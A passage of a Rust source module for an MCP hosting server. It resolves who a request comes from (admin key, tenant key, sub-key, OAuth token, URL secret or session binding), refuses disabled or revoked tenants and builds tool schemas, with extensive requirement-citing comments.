//! The `rmcp::ServerHandler` implementation: `initialize`, `list_tools` and
//! `call_tool`. This is the only module that translates between `rmcp` wire
//! types and the plain `serde_json::Value` business logic in `control.rs`
//! and `admin.rs`.

use std::borrow::Cow;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};

use rmcp::ErrorData as McpError;
use rmcp::model::{
    CacheScope, CallToolRequestParams, CallToolResponse, Implementation,
    ListToolsResult, PaginatedRequestParams, ServerInfo, Tool,
};
use rmcp::service::{NotificationContext, Peer, RequestContext};
use rmcp::{RoleServer, ServerHandler};
use serde_json::{Map, Value, json};

use crate::auth::{constant_time_eq, extract_bearer, hash_key};
use crate::db::{Tenant, ToolRow};
use crate::errors::AppError;
use crate::kinds::{
    CallCtx, CallLog, ChannelBackend, DocsBackend, DriftBackend, Kind, KindError, KindRegistry,
    LineageBackend, MAX_TEST_INVOCATIONS, MsgBackend, NoChannel, NoDocs, NoLineage, NoMsg,
    NoState, NoTable, NullLog, NullResourceSink, ResourceSink, SecretResolver, StateBackend,
    TableBackend, describe_args_error, run_spec_test,
};
use crate::state::{
    AppState, MAX_SPEC_BYTES, TOOLS_LIST_TTL_GRACE_SECS, TOOLS_LIST_TTL_MS_STEADY, now_unix,
};
use crate::{admin, agents, channels, consent, control, docs, messaging, tables, tenant_state};

mod arms;
mod preauth;
pub use arms::{ArmCtx, ArmFut};

/// Who is making this request, resolved once per request from the bearer
/// key (or its absence).
enum Auth {
    /// No `Authorization` header at all.
    Anonymous,
    /// An `Authorization` header that matches neither the admin key nor any
    /// tenant's key hash.
    Invalid,
    Admin,
    /// PRD-grand-loop-billing: `Tenant` grew three billing columns
    /// (`plan`/`plan_since`/`billing_ref`), pushing this enum over
    /// clippy's `large_enum_variant` threshold when carried by value
    /// alongside the zero-sized `Anonymous`/`Invalid`/`Admin` variants --
    /// boxed per the lint's own suggestion rather than shrinking `Tenant`
    /// itself (every other variant is unaffected; every call site already
    /// takes `&Tenant`, which `Box<Tenant>` derefs to for free).
    ///
    /// PRD-mcphost-oauth-resource-server requirement 4: the second field is
    /// the resolved OAuth bearer (JWT `sub`/`iss`) when this tenant was
    /// resolved from one, `None` for the pre-existing key paths (header or
    /// `tenant_key` argument) -- see `control::whoami`'s own doc comment.
    /// PRD-mcphost-end-user-identity requirement 1 reads the same value to
    /// populate `Caller.end_user` for an OAuth-authenticated call.
    Tenant(Box<Tenant>, Option<crate::oauth::OauthCaller>),
}

/// PRD-mcphost-call-concurrency-visible R3: the `calls.error_class` a failed
/// call is recorded under -- its wire code, except that the tenant-scope
/// `concurrency_exceeded` refusal is recorded as `concurrency` so a tenant
/// hitting its own cap is told apart from the host hitting its ceiling
/// (`capacity`).
fn call_error_class(err: &AppError) -> &'static str {
    match err.code() {
        "concurrency_exceeded" => "concurrency",
        other => other,
    }
}

fn value_to_json_object(v: Value) -> Map<String, Value> {
    v.as_object().cloned().unwrap_or_default()
}

/// PRD-mcphost-oauth-demand-signal requirement 1 (AC1): `calls.auth_method`'s
/// own `{key, issuer_jwt, hosted_token}` domain, derived from the same
/// `Option<OauthCaller>` `host.whoami`'s `auth_method` (`{key, oauth,
/// hosted_token}`) already reads -- kept as a separate function rather than
/// widening that domain, since `oauth_ac*`/`hostedas_ac10` already pin
/// `"oauth"` as `host.whoami`'s own reported value and must not change.
///
/// PRD-mcphost-session-bound-tenant-after-signup requirement 8 (AC11): the
/// domain gains `session` -- a call that presented no credential at all and
/// resolved through this connection's own post-`signup` binding, so demand
/// and audit views can tell it apart from a call that presented a key. Never
/// set alongside an `OauthCaller`: the binding is only ever consulted when
/// neither an `Authorization` header nor a `tenant_key` argument resolved
/// (see `call_tool`), so `via_session_binding` implies `oauth_caller ==
/// None`.
///
/// PRD-mcphost-url-bound-tenants requirement 7: the domain gains `url` --
/// resolved via the request's own `/u/{secret}/mcp` path, the new
/// highest-precedence step (checked before any of the others, so
/// `via_url_secret` implies both `oauth_caller == None` and
/// `via_session_binding == false`).
fn calls_auth_method(
    oauth_caller: Option<&crate::oauth::OauthCaller>,
    via_session_binding: bool,
    via_url_secret: bool,
) -> &'static str {
    match oauth_caller.map(|o| o.auth_method) {
        _ if via_url_secret => "url",
        None if via_session_binding => "session",
        None => "key",
        Some("hosted_token") => "hosted_token",
        Some(_) => "issuer_jwt",
    }
}

/// PRD-mcphost-key-scoped-to-tools R3: `resolve_auth` tries `tenant_keys`
/// after `tenants.key_hash`. `Some(tenant)` (with `sub` filled) iff `key`
/// is a known sub-key; `None` for every other key shape, so the callers'
/// existing unknown-key handling is untouched. The caller applies its own
/// disabled-tenant refusal (header and argument paths differ).
async fn resolve_sub_key_tenant(
    state: &AppState,
    key: &str,
    sub: &mut Option<crate::subkeys::SubKey>,
) -> Result<Option<Tenant>, AppError> {
    if !key.starts_with(crate::auth::SUB_KEY_PREFIX) {
        return Ok(None);
    }
    let Some(found) = state.db.find_sub_key_by_hash(hash_key(key)).await? else {
        return Ok(None);
    };
    let Some(tenant) = state.db.find_tenant_by_id(found.tenant_id).await? else {
        return Ok(None);
    };
    if let Some(dead) = found.dead_reason(now_unix()) {
        return Err(dead);
    }
    // R4: a revoked or expired ancestor makes the descendant invalid even if
    // a cascade raced this lookup (depth <= 3, so at most two reads).
    let mut up = found.parent_key_id;
    while let Some(pid) = up {
        let Some(ancestor) = state.db.find_sub_key_by_id(pid).await? else { break };
        if let Some(dead) = ancestor.dead_reason(now_unix()) {
            return Err(dead);
        }
        up = ancestor.parent_key_id;
    }
    if let Err(e) = state.db.touch_sub_key(found.id, now_unix()).await {
        tracing::warn!(error = %e, tenant = %tenant.namespace, "failed to bump sub-key last_used_at");
    }
    *sub = Some(found);
    Ok(Some(tenant))
}

/// A disabled tenant is refused at every resolver, except that a
/// self-offboarded tenant may still reach its own lifecycle-terminal verb
/// (`auth_shape::LIFECYCLE_TERMINAL_VERBS`) so that verb can answer
/// idempotently instead of the auth layer turning success into an error.
/// The refusal a disabled tenant's own credential (URL secret or header)
/// gets: `TenantDisabled`, plus `claim_url` once the unclaimed policy has
/// invalidated it, so the holder can still claim during the grace.
fn tenant_disabled_error(state: &AppState, t: &Tenant) -> AppError {
    let claim_url = (t.disabled_reason.as_deref() == Some(crate::auth_shape::UNCLAIMED_EXPIRED_REASON))
        .then(|| crate::claim::claim_url_for_tenant(&state.public_url, t))
        .flatten();
    AppError::TenantDisabled { disabled_reason: t.disabled_reason.clone(), claim_url }
}

fn is_refused_disabled(t: &Tenant, verb: &str) -> bool {
    t.disabled && !crate::auth_shape::lets_through_disabled(verb, t.disabled_reason.as_deref())
}

async fn resolve_auth(
    state: &AppState,
    parts: &http::request::Parts,
    sub: &mut Option<crate::subkeys::SubKey>,
    verb: &str,
) -> Result<Auth, AppError> {
    let Some(key) = extract_bearer(&parts.headers) else {
        return Ok(Auth::Anonymous);
    };
    if let Some(admin_key) = &state.admin_key
        && constant_time_eq(key.as_bytes(), admin_key.as_bytes())
    {
        return Ok(Auth::Admin);
    }
    let hash = hash_key(&key);
    if let Some(t) = resolve_sub_key_tenant(state, &key, sub).await? {
        if is_refused_disabled(&t, verb) {
            return Err(tenant_disabled_error(state, &t));
        }
        if let Err(e) = state.db.touch_last_seen(t.id, now_unix()).await {
            tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump last_seen_unix");
        }
        return Ok(Auth::Tenant(Box::new(t), None));
    }
    match state.db.find_tenant_by_key_hash(hash).await? {
        Some(t) if is_refused_disabled(&t, verb) => Err(tenant_disabled_error(state, &t)),
        Some(t) => {
            // PRD-mcphost-agent-directory requirement 6: `last_seen` is the
            // tenant's most recent authenticated request -- bumped here,
            // the one place both this header path and the argument path
            // below resolve a live tenant. Best-effort: a write failure
            // must never fail the request that carried it.
            if let Err(e) = state.db.touch_last_seen(t.id, now_unix()).await {
                tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump last_seen_unix");
            }
            Ok(Auth::Tenant(Box::new(t), None))
        }
        // PRD-mcphost-oauth-resource-server requirement 4: a bearer that
        // matches no tenant key hash falls through to OAuth JWT validation
        // ONLY when it's shaped like a JWT (three dot-separated segments)
        // -- this crate's own tenant keys are 64 hex chars and never
        // contain '.', so a garden-variety wrong key keeps resolving to
        // `Auth::Invalid` exactly as before (AC10:
        // autherr_ac4's "not-a-real-key-at-all" case is unaffected).
        None if key.split('.').count() == 3 => {
            let result = crate::oauth::validate_bearer(state, &key).await?;
            crate::oauth::check_entry_audience(&state.public_url, parts.uri.path(), &result)?;
            match state.db.find_tenant_by_id(result.tenant_id).await? {
                Some(t) if is_refused_disabled(&t, verb) => Err(tenant_disabled_error(state, &t)),
                Some(t) => {
                    if let Err(e) = state.db.touch_last_seen(t.id, now_unix()).await {
                        tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump last_seen_unix");
                    }
                    Ok(Auth::Tenant(Box::new(t), Some(result)))
                }
                None => Ok(Auth::Invalid),
            }
        }
        None => Ok(Auth::Invalid),
    }
}

/// PRD-mcphost-session-key requirement 5's argument-derived fallback:
/// consulted from `call_tool` only when the header path above resolved to
/// `Auth::Anonymous` (no `Authorization` header at all -- requirement 6,
/// the header always wins whenever one is present, valid or not). Kept
/// separate from `resolve_auth` rather than threading call arguments into
/// it: that function's other callers (`list_tools`, and `call_tool`'s own
/// header-only resolution above) have no `tools/call` arguments to give it.
/// Mirrors `resolve_auth`'s header branch exactly -- same disabled/unknown
/// handling -- so an argument-based and header-based key are authorized
/// identically (requirement 5) and refused identically (requirements 7, 8).
async fn resolve_tenant_key_auth(
    state: &AppState,
    args: &Value,
    sub: &mut Option<crate::subkeys::SubKey>,
    verb: &str,
) -> Result<Auth, AppError> {
    let Some(key) = args.get("tenant_key").and_then(Value::as_str) else {
        return Ok(Auth::Anonymous);
    };
    let hash = hash_key(key);
    if let Some(t) = resolve_sub_key_tenant(state, key, sub).await? {
        if is_refused_disabled(&t, verb) {
            return Err(AppError::TenantKeyInvalid);
        }
        if let Err(e) = state.db.touch_last_seen(t.id, now_unix()).await {
            tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump last_seen_unix");
        }
        return Ok(Auth::Tenant(Box::new(t), None));
    }
    match state.db.find_tenant_by_key_hash(hash).await? {
        // PRD-mcphost-auth-error-names-argument requirement 2 / AC3: unlike
        // the header path's `AppError::TenantDisabled` (unchanged --
        // ac08_admin_disable_and_forbidden.rs pins that), a disabled
        // tenant's key sent as the `tenant_key` argument reads as
        // `tenant_key_invalid`, the same as any other unrecognized key --
        // it never distinguishes "exists but disabled" from "doesn't
        // exist" for this path, so nothing about a guessed key's validity
        // leaks through it.
        Some(t) if is_refused_disabled(&t, verb) => Err(AppError::TenantKeyInvalid),
        Some(t) => {
            // See the mirrored comment in `resolve_auth` above.
            if let Err(e) = state.db.touch_last_seen(t.id, now_unix()).await {
                tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump last_seen_unix");
            }
            Ok(Auth::Tenant(Box::new(t), None))
        }
        None => Ok(Auth::Invalid),
    }
}

/// PRD-mcphost-url-bound-tenants requirement 1: the `<secret>` segment of a
/// `/u/{secret}/mcp` request, read straight off the original request's own
/// URI -- same convention as `tenant_path_namespace` above. `None` for
/// every other path (`/mcp`, `/t/{ns}/mcp`, ...).
fn url_path_secret(parts: &http::request::Parts) -> Option<&str> {
    parts.uri.path().strip_prefix("/u/")?.strip_suffix("/mcp")
}

/// PRD-mcphost-url-bound-tenants requirement 1: the new, highest-precedence
/// step in the `Auth` chain ("path secret -> Authorization header ->
/// tenant_key argument -> session binding -> anonymous") -- consulted
/// before [`resolve_auth`] itself. `Ok(None)` for any path that isn't
/// `/u/{secret}/mcp` at all, so every other route's resolution is
/// untouched. A secret this host has never issued (or has since rotated
/// away from) should never reach here in practice -- `http::require_known_url_secret`
/// already 404s the request before dispatch ever runs -- but a disabled
/// tenant's own still-valid secret is handled explicitly, the same
/// `TenantDisabled` refusal the header/argument paths already give a
/// disabled tenant's key.
async fn resolve_path_secret_auth(
    state: &AppState,
    parts: &http::request::Parts,
    verb: &str,
) -> Result<Option<Auth>, AppError> {
    let Some(secret) = url_path_secret(parts) else {
        return Ok(None);
    };
    let hash = hash_key(secret);
    match state.db.find_tenant_by_url_secret_hash(hash.clone()).await? {
        Some(t) if is_refused_disabled(&t, verb) => Err(tenant_disabled_error(state, &t)),
        Some(t) => {
            // See the mirrored comment in `resolve_auth` above.
            if let Err(e) = state.db.touch_last_seen(t.id, now_unix()).await {
                tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump last_seen_unix");
            }
            // PRD-mcphost-activation-funnel requirement 2: a
            // `/u/{secret}/mcp` call is one of the two mechanisms
            // `second_session_unix` watches -- see
            // `maybe_stamp_second_session`'s own doc comment.
            maybe_stamp_second_session(state, &t, session_id(parts).as_deref()).await;
            Ok(Some(Auth::Tenant(Box::new(t), None)))
        }
        // PRD-mcphost-same-user-second-agent R2: not a tenant's own URL
        // secret -- a sibling client's? A revoked client, or a secret a
        // client has since rotated away from, is `tenant_key_invalid`.
        None => {
            if let Some(client) = state.db.find_client_by_secret_hash(hash.clone()).await? {
                if client.revoked_unix.is_some() {
                    return Err(AppError::TenantKeyInvalid);
                }
                let Some(t) = state.db.find_tenant_by_id(client.tenant_id).await? else {
                    return Ok(None);
                };
                if is_refused_disabled(&t, verb) {
                    return Err(tenant_disabled_error(state, &t));
                }
                if let Err(e) = state.db.touch_last_seen(t.id, now_unix()).await {
                    tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump last_seen_unix");
                }
                if let Err(e) = state.db.touch_client(client.id.clone()).await {
                    tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump client last_seen_unix");
                }
                return Ok(Some(Auth::Tenant(Box::new(t), None)));
            }
            if state.db.is_retired_client_secret(hash).await? {
                return Err(AppError::TenantKeyInvalid);
            }
            Ok(None)
        }
    }
}

/// PRD-mcphost-activation-funnel requirement 2 / technical considerations:
/// `second_session_unix` fires on the first authenticated call whose
/// session differs from [`Tenant::created_session_id`], at least 10
/// minutes after `created_unix` -- never on the creating session's own
/// reconnects. Consulted from the two mechanisms the PRD names: a later
/// [`bind_session_to_created_tenant`] bind (e.g. `host.redeem` on a
/// different connection than the handoff-signup session) and
/// [`resolve_path_secret_auth`] (a `/u/{secret}/mcp` reconnect). When
/// `tenant.created_session_id` is `None` (no session was ever recorded at
/// creation -- a stateless client, or a tenant born before this
/// migration) this falls back to the time-only half of the rule: any call
/// at least 10 minutes after `created_unix` counts, since there is
/// nothing to compare the session id against.
async fn maybe_stamp_second_session(state: &AppState, tenant: &Tenant, session_id: Option<&str>) {
    const MIN_GAP_SECS: i64 = 600;
    if tenant.second_session_unix.is_some() {
        return;
    }
    let Some(created_unix) = tenant.created_unix else {
        return;
    };
    let now = now_unix();
    if now - created_unix < MIN_GAP_SECS {
        return;
    }
    let is_second_session = match (tenant.created_session_id.as_deref(), session_id) {
        (Some(created), Some(current)) => created != current,
        _ => true,
    };
    if is_second_session
        && let Err(e) = state.db.touch_second_session(tenant.id, now).await
    {
        tracing::warn!(error = %e, tenant = %tenant.namespace, "failed to bump second_session_unix");
    }
}

/// PRD-mcphost-session-bound-tenant-after-signup requirement 1: every tool
/// that hands the caller a freshly-created tenant's own key binds that
/// tenant to the session the call arrived on. Those are exactly `signup`
/// (`control::signup`) and `host.redeem` (`control::redeem`) -- the two
/// results in this crate that carry a `key` field the caller did not
/// already hold; `host.key_rotate` returns a key too, but to a caller that
/// is *already* authenticated as that tenant, so it never reaches here.
///
/// Requirement 5, "a binding is only ever created from a tenant this session
/// created or redeemed itself": the tenant is resolved from the key inside
/// the result this very call just produced, never from anything the caller
/// named. `signup(handoff: true)` returns a handoff token and no key, so it
/// binds nothing -- the connection that later redeems that token is the one
/// that gets the binding.
///
/// Requirement 6 (AC6): a bound response says so, in a machine-readable
/// field and in the `usage` sentence the agent is already reading.
///
/// PRD-mcphost-one-next-tool requirement 3 (AC3): `peer` is this very
/// request's own peer handle -- in mcphost's stateless streamable-HTTP
/// setup (`with_legacy_session_mode(false)`, `src/http.rs`), that is the
/// only server-to-client channel this session is ever guaranteed to have
/// open, so the notification rides the same response as the `signup`/
/// `host.redeem` result that just bound it (`rmcp`'s own
/// `StreamableHttpServerConfig::json_response` doc: a notification emitted
/// before the handler's final response forces that one response to upgrade
/// from plain JSON to an SSE stream carrying both, in order). Best-effort,
/// per the PRD's own technical considerations ("when the client has none
/// open, the notification is dropped and the full list appears on the
/// client's next tools/list anyway") -- a send failure never fails the
/// call that triggered it.
async fn bind_session_to_created_tenant(
    state: &AppState,
    session_id: Option<&str>,
    peer: &Peer<RoleServer>,
    result: Result<Value, AppError>,
) -> Result<Value, AppError> {
    let mut value = result?;
    let Some(session_id) = session_id else {
        return Ok(value);
    };
    let Some(key) = value.get("key").and_then(Value::as_str) else {
        return Ok(value);
    };
    let Some(tenant) = state.db.find_tenant_by_key_hash(hash_key(key)).await? else {
        return Ok(value);
    };
    if !state.session_bindings.bind(session_id, tenant.id, now_unix()) {
        return Ok(value);
    }
    // PRD-mcphost-activation-funnel requirement 2: the FIRST bind this
    // tenant ever gets records the creating session; a LATER one (e.g.
    // `host.redeem` on a different connection than the handoff-signup
    // session) is itself a candidate "second session" -- see
    // `maybe_stamp_second_session`'s own doc comment.
    if tenant.created_session_id.is_none() {
        if let Err(e) = state.db.set_created_session_id(tenant.id, session_id.to_string()).await {
            tracing::warn!(error = %e, tenant = %tenant.namespace, "failed to record created_session_id");
        }
    } else {
        maybe_stamp_second_session(state, &tenant, Some(session_id)).await;
    }
    tracing::info!(tenant = %tenant.namespace, "session bound to tenant after signup");
    if let Err(e) = crate::protocol::frames::emit(peer, crate::protocol::frames::Frame::ToolListChanged, crate::protocol::frames::REQ_KEYLESS_SIGNUP).await {
        tracing::warn!(tenant = %tenant.namespace, error = %e, "notify_tool_list_changed failed");
    }
    if let Some(obj) = value.as_object_mut() {
        obj.insert("session_bound".to_string(), json!(true));
        if let Some(usage) = obj.get("usage").and_then(Value::as_str) {
            obj.insert(
                "usage".to_string(),
                json!(format!(
                    "{usage} Later calls on this connection need no tenant_key at all; a new \
                     connection must pass the returned key (as the tenant_key argument or an \
                     Authorization: Bearer header)."
                )),
            );
        }
    }
    Ok(value)
}

/// PRD-mcphost-webhook-inbox-one-call R3: this request's peer (client IP +
/// User-Agent, hashed) -- the only identity a stateless `/mcp` call has that
/// survives from a `signup`/`host.redeem` to the next key-less call.
fn request_peer_key(parts: &http::request::Parts) -> String {
    crate::peer_recent::peer_key(&source_ip(parts), user_agent_header(parts).as_deref())
}

/// PRD-mcphost-session-bound-tenant-key requirement 1/3: the implicit-signup
/// counterpart of [`bind_session_to_created_tenant`] above, for the ONE call
/// site that creates a tenant with no explicit `signup`/`host.redeem` at all
/// ([`McpHostHandler::implicit_signup_and_dispatch`]). Deliberately does NOT
/// write to `state.session_bindings` -- that map's own `resolve_session_binding`
/// unconditionally trusts whatever it finds, which is exactly right for an
/// explicit signup/redeem (the caller asked for a tenant) but wrong here: a
/// second key-less call on this same connection must be refused and named by
/// default (requirement 2), not silently served. `tenant` is always a
/// freshly-created row (`tenant.created_session_id` is always `None` on
/// entry), so unlike `bind_session_to_created_tenant` this never has a
/// "rebind an existing tenant" branch to consider.
async fn record_implicit_signup_memory(
    state: &AppState,
    session_id: Option<&str>,
    peer: &Peer<RoleServer>,
    tenant: &Tenant,
) {
    let Some(session_id) = session_id else {
        return;
    };
    if !state.implicit_signup_memory.bind(session_id, tenant.id, now_unix()) {
        return;
    }
    if let Err(e) = state.db.set_created_session_id(tenant.id, session_id.to_string()).await {
        tracing::warn!(error = %e, tenant = %tenant.namespace, "failed to record created_session_id");
    }
    if let Err(e) = crate::protocol::frames::emit(peer, crate::protocol::frames::Frame::ToolListChanged, crate::protocol::frames::REQ_KEYLESS_SIGNUP).await {
        tracing::warn!(tenant = %tenant.namespace, error = %e, "notify_tool_list_changed failed");
    }
}

/// PRD-mcphost-session-bound-tenant-after-signup requirement 1: the third
/// and last step of the precedence rule (requirement 2 -- header, then
/// explicit `tenant_key`, then the session's bound tenant). `call_tool`
/// consults this only when the two steps above it both came back
/// `Auth::Anonymous`, i.e. the call carried no `Authorization` header AND no
/// `tenant_key` argument at all -- an *invalid* explicit key resolves to
/// `Auth::Invalid` and never reaches here, so a binding can never silently
/// replace a key the caller actually sent (AC4).
///
/// Requirement 5: a binding only ever names a tenant the session itself
/// created, so the only way it can go stale is the tenant being disabled or
/// deleted afterwards. Both drop it: a disabled tenant surfaces the existing
/// `TenantDisabled` error for this call, a deleted one falls through to the
/// unchanged `tenant_key_missing` refusal, and in either case the next
/// key-less call on the session is refused like any anonymous one (AC9).
async fn resolve_session_binding(
    state: &AppState,
    session_id: &str,
    verb: &str,
) -> Result<Option<Auth>, AppError> {
    let Some(tenant_id) = state.session_bindings.lookup(session_id, now_unix()) else {
        return Ok(None);
    };
    match state.db.find_tenant_by_id(tenant_id).await? {
        Some(t) if is_refused_disabled(&t, verb) => {
            state.session_bindings.drop_binding(session_id);
            Err(AppError::TenantDisabled { disabled_reason: t.disabled_reason.clone(), claim_url: None })
        }
        Some(t) => {
            // PRD-mcphost-same-user-second-agent R4: a session that joined
            // as a sibling dies with that client -- a revoke lands on its
            // very next call. Only join sessions carry a client binding, so
            // every other session pays no extra read.
            if let Some(client_id) = state.session_bindings.client_lookup(session_id, t.id)
                && state.db.client_is_revoked(client_id).await?
            {
                state.session_bindings.drop_binding(session_id);
                return Err(AppError::TenantKeyInvalid);
            }
            // See the mirrored comment in `resolve_auth` above.
            if let Err(e) = state.db.touch_last_seen(t.id, now_unix()).await {
                tracing::warn!(error = %e, tenant = %t.namespace, "failed to bump last_seen_unix");
            }
            Ok(Some(Auth::Tenant(Box::new(t), None)))
        }
        None => {
            state.session_bindings.drop_binding(session_id);
            Ok(None)
        }
    }
}

fn get_parts(ctx: &RequestContext<RoleServer>) -> Result<&http::request::Parts, McpError> {
    // Plain `into_error_data()` (no base url): there is no `AppState` in
    // scope here to build a `help_url` from, and this branch only fires for
    // a non-HTTP transport (no request parts at all) -- a condition the
    // caller has no page to visit for anyway. Every error built *after*
    // `parts` is available below uses `into_error_data_at` instead (see its
    // doc comment on `AppError`, PRD-mcphost-first-hour-support-surface
    // requirement 1/7).
    ctx.extensions.get::<http::request::Parts>().ok_or_else(|| {
        AppError::Internal("no HTTP request parts on this call".into()).into_error_data()
    })
}

/// The source address used for signup rate limiting, `signup_events`, and
/// every other per-source read (requirement 4: one call site, funneling
/// through [`crate::state::resolve_source_ip`]). PRD-mcphost-client-ip-behind-proxy:
/// mcphost.dev runs behind Caddy on the same box, so the TCP peer axum's
/// `ConnectInfo` extractor attaches is loopback for every proxied request --
/// `resolve_source_ip` reads `X-Forwarded-For` in that case and falls back
/// to the peer address otherwise (or when the header is missing or
/// unparseable). HTTP header lookup is case-insensitive, so
/// `X-Forwarded-For` (Caddy's default casing) matches the lowercase name
/// here.
fn source_ip(parts: &http::request::Parts) -> String {
    let peer = parts
        .extensions
        .get::<axum::extract::ConnectInfo<std::net::SocketAddr>>()
        .map(|ci| ci.0.ip().to_string());
    let forwarded_for = parts
        .headers
        .get("x-forwarded-for")
        .and_then(|v| v.to_str().ok());
    crate::state::resolve_source_ip(peer.as_deref(), forwarded_for)
}

/// PRD-mcphost-tenant-resource-metadata requirement 1: the `<ns>` segment
/// of a `/t/{ns}/mcp` request, read straight off the original request's own
/// URI (`http.rs::build_router` routes both `/mcp` and `/t/{ns}/mcp` to the
/// same tower service, and `rmcp` forwards the exact incoming `Request`'s
/// `http::request::Parts` unmodified) -- `None` for `/mcp` itself, which
/// carries no tenant restriction.
fn tenant_path_namespace(parts: &http::request::Parts) -> Option<&str> {
    parts.uri.path().strip_prefix("/t/")?.strip_suffix("/mcp")
}

/// PRD-mcphost-session-bound-tenant-after-signup requirement 1: this
/// request's streamable-HTTP session identifier. Always present on a `/mcp`
/// or `/t/{ns}/mcp` request -- `http::issue_session_id` mints one when the
/// caller presented none (or presented a value this process never minted),
/// so what lands here is always server-generated, never client input. Read
/// from the request's extensions rather than its headers: see
/// [`crate::session_bind::RequestSessionId`] for why the header itself is
/// left exactly as the client sent it.
/// The identity a resource subscription is filed under: the session id this
/// host minted for the request, else the transport's own `Mcp-Session-Id`.
/// Empty for a connection with neither (then only the peer's liveness ties
/// the entry to its connection).
fn conn_key(parts: &http::request::Parts) -> String {
    session_id(parts)
        .or_else(|| parts.headers.get("mcp-session-id").and_then(|v| v.to_str().ok()).map(str::to_string))
        .unwrap_or_default()
}

fn session_id(parts: &http::request::Parts) -> Option<String> {
    parts
        .extensions
        .get::<crate::session_bind::RequestSessionId>()
        .map(|s| s.0.clone())
}

fn mcp_name_header(parts: &http::request::Parts) -> Option<String> {
    parts
        .headers
        .get("Mcp-Name")
        .and_then(|v| v.to_str().ok())
        .map(str::to_string)
}

/// PRD-mcphost-synthetic-flag requirement 2: the raw `x-mcphost-synthetic`
/// header value, unvalidated -- `control::signup` (via
/// `validate_synthetic_header`) is where the charset/length check and the
/// "invalid logs a warning" behavior live, same division of labor as
/// `source_ip`/`mcp_name_header` above (HTTP-layer extraction here,
/// business-logic validation in `control.rs`).
fn synthetic_header(parts: &http::request::Parts) -> Option<String> {
    parts
        .headers
        .get("x-mcphost-synthetic")
        .and_then(|v| v.to_str().ok())
        .map(str::to_string)
}

/// PRD-mcphost-funnel-truth requirement 2: the raw `X-Mcphost-Origin`
/// header value, unvalidated -- same HTTP-layer-extraction-only division
/// of labor as [`synthetic_header`] above. `control::signup`/the invite
/// implicit-signup path (via [`crate::state::classify_funnel_origin`]) is
/// where "only honoured from a fleet IP, and only the literal value
/// `probe`" actually gets decided.
fn origin_header(parts: &http::request::Parts) -> Option<String> {
    parts
        .headers
        .get("x-mcphost-origin")
        .and_then(|v| v.to_str().ok())
        .map(str::to_string)
}

/// PRD-mcphost-tenant-attribution requirement 2: `signup_events.user_agent`,
/// when the transport exposes one -- best-effort, same as `mcp_name_header`
/// above (an absent or non-UTF-8 header is silently `None`, never an
/// error).
fn user_agent_header(parts: &http::request::Parts) -> Option<String> {
    parts
        .headers
        .get(http::header::USER_AGENT)
        .and_then(|v| v.to_str().ok())
        .map(str::to_string)
}

/// PRD-mcphost-tenant-attribution requirement 2: the caller's
/// `clientInfo.name`/`version`. `RequestContext::client_info` (`rmcp`'s own
/// SEP-2575-aware accessor) is deliberately used instead of reading
/// `ctx.peer.peer_info()` directly: this host's streamable-HTTP config
/// (`with_legacy_session_mode(false)`) runs every `tools/call` as its own
/// stateless request rather than a session `initialize` persists across
/// (this crate's own `tests/common`'s `_meta` injection on every call, not
/// just `initialize`, is the other side of the same fact) -- `client_info`
/// reads the per-request `_meta["io.modelcontextprotocol/clientInfo"]` a
/// SEP-2575 client sends on that call in that case, falling back to the
/// session-persisted value only for a genuinely stateful/legacy peer.
/// `None` when neither is present (a client that doesn't send `clientInfo`
/// at all -- signup still succeeds, requirement 2 doesn't make this
/// mandatory).
///
/// PRD-mcphost-client-attribution-default-leak: `ctx.client_info()`'s
/// stateful/legacy fallback reads `ctx.peer.peer_info()` -- and for this
/// host's stateless streamable-HTTP path (every single-shot request with no
/// prior `initialize`), `rmcp` itself synthesizes that `peer_info` via
/// `peer_info_for_stateless_request()`, filling `client_info` with
/// `Implementation::default()` purely so `RequestContext::protocol_version()`
/// has a fallback -- NOT because the caller reported any identity. That
/// placeholder is `Implementation::from_build_env()`: `rmcp`'s own crate
/// name/version, baked into the `rmcp` binary at ITS compile time (e.g.
/// `name: "rmcp", version: "3.2.0"`), regardless of who calls it. Left
/// unchecked, a caller that sends zero `clientInfo` gets attributed as if it
/// were the server's own SDK -- exactly the false-precision this PRD fixes.
/// Comparing the resolved info against a freshly-built
/// `Implementation::default()` (same constant, every call, every process --
/// it is `rmcp`'s own compiled-in identity, not a parsed/attacker-influenced
/// value) distinguishes "genuinely absent" from "explicitly reported": treat
/// an exact match as absent (`None`) rather than persisting or surfacing it
/// as real attribution. A caller whose real `clientInfo` (from its own
/// `initialize` handshake or a SEP-2575 per-request `_meta`) differs from
/// this placeholder in name or version is unaffected -- requirement 2 /
/// AC2's "real reported client name/version captured unchanged" case.
fn peer_client_info(ctx: &RequestContext<RoleServer>) -> Option<(String, String)> {
    ctx.client_info().and_then(|info| {
        if info == Implementation::default() {
            None
        } else {
            Some((info.name.clone(), info.version.clone()))
        }
    })
}

/// PRD-mcphost-quickstart-by-client R4: the surface this `host.quickstart`
/// caller is running in -- `clientInfo` (initialize or per-request `_meta`,
/// as [`peer_client_info`] reads it) first, then the `User-Agent`.
fn quickstart_detection(
    ctx: &RequestContext<RoleServer>,
    parts: &http::request::Parts,
) -> Option<(&'static str, &'static str)> {
    let client = peer_client_info(ctx);
    crate::install_links::detect(client.as_ref().map(|(name, _)| name.as_str()), user_agent_header(parts).as_deref())
}

// ---- static control-plane / admin tool descriptors -----------------------

fn schema(props: Value, required: &[&str]) -> Map<String, Value> {
    value_to_json_object(json!({
        "type": "object",
        "properties": props,
        "required": required,
        // PRD-mcphost-spec-unknown-field-rejection requirement 3 (AC5):
        // every control-plane tool this function builds a schema for
        // (`host.*`/`billing.*` via `host_schema`, `admin.*` directly)
        // advertises that an unlisted top-level argument is invalid, so a
        // schema-aware client catches it before the call ever reaches the
        // host. A published TENANT tool's own schema (`Kind::describe`)
        // is built entirely separately (each kind's own `json!` literal,
        // e.g. `http::compile_upstream`'s own explicit `additionalProperties:
        // false`) and never goes through this function -- non-goal 2 ("an
        // unknown key inside a tool's own `schema`... belongs to the tool
        // author") is untouched.
        "additionalProperties": false,
    }))
}

/// [`schema`] for an `admin.*` tool; validated like every other descriptor
/// (the key is written once, by [`crate::host_args::mark_validated`]).
